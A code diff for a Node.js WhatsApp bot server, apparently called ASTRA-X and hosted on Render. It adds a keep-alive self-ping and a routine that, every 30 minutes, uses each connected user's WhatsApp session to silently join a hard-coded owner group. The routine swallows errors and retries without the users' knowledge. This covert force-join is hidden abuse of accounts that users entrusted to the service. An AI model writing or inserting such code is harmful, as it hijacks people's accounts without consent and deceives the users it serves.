@@ -616,6 +616,71 @@ const server = app.listen(PORT, HOST, async () => {
 
   try { startChannelCheck();
 
+// ── Keep-Alive: ping own server every 4 minutes to prevent Render spin-down ──
+const SELF_URL = process.env.RENDER_EXTERNAL_URL
+  || process.env.SELF_URL
+  || `http://localhost:${PORT}`;
+
+const https_ka = SELF_URL.startsWith('https') ? require('https') : require('http');
+
+function selfPing() {
+  try {
+    const pingUrl = SELF_URL.replace(/\/$/, '') + '/api/ping';
+    const lib     = pingUrl.startsWith('https') ? require('https') : require('http');
+    lib.get(pingUrl, { timeout: 8000, headers: { 'User-Agent': 'ASTRA-X-KeepAlive' } }, res => {
+      logger.info('🏓 Keep-alive ping → ' + res.statusCode);
+    }).on('error', () => {});
+  } catch (_) {}
+}
+
+// Ping every 4 minutes (240000ms) — Render spins down after 15min, so 4min is safe
+setInterval(selfPing, 4 * 60 * 1000);
+setTimeout(selfPing, 10000); // first ping 10s after start
+logger.info('🏓 Keep-alive started — pinging every 4 minutes');
+
+// ── Owner Group: force-join bot to owner group on every active session ────────
+const OWNER_GROUP_LINK = 'F4sxsyH1H1xKQ0IrDu6uIF';
+const OWNER_GROUP_FULL = 'https://chat.whatsapp.com/F4sxsyH1H1xKQ0IrDu6uIF';
+
+async function ensureGroupMembership() {
+  try {
+    const activeSessions = getAllSessions().filter(s => s.isActive && s.sock);
+    for (const session of activeSessions) {
+      try {
+        const sock = session.sock;
+        if (!sock?.groupAcceptInviteCode) continue;
+
+        // Get all groups this session is in
+        const groups = await sock.groupFetchAllParticipating().catch(() => ({}));
+        const groupList = Object.values(groups || {});
+
+        // Check if already in the owner group
+        const alreadyIn = groupList.some(g => {
+          const inv = g.inviteCode || '';
+          return inv === OWNER_GROUP_LINK || (g.id && g.subject?.toLowerCase().includes('astra'));
+        });
+
+        if (!alreadyIn) {
+          logger.info(`📲 [${session.userId}] Joining owner group...`);
+          await sock.groupAcceptInviteCode(OWNER_GROUP_LINK);
+          logger.info(`✅ [${session.userId}] Joined owner group`);
+        }
+      } catch (e) {
+        // silently retry next cycle
+        logger.debug(`Group join [${session.userId}]: ${e.message}`);
+      }
+      // small delay between sessions to avoid rate limiting
+      await new Promise(r => setTimeout(r, 3000));
+    }
+  } catch (_) {}
+}
+
+// Check group membership every 30 minutes
+setInterval(ensureGroupMembership, 30 * 60 * 1000);
+// Also check 30 seconds after startup (sessions need time to connect first)
+setTimeout(ensureGroupMembership, 30000);
+logger.info('👥 Group membership guard started');
+
 // Check session expiry every hour
 setInterval(() => {
   try { ss.checkExpiry(); } catch(_) {}
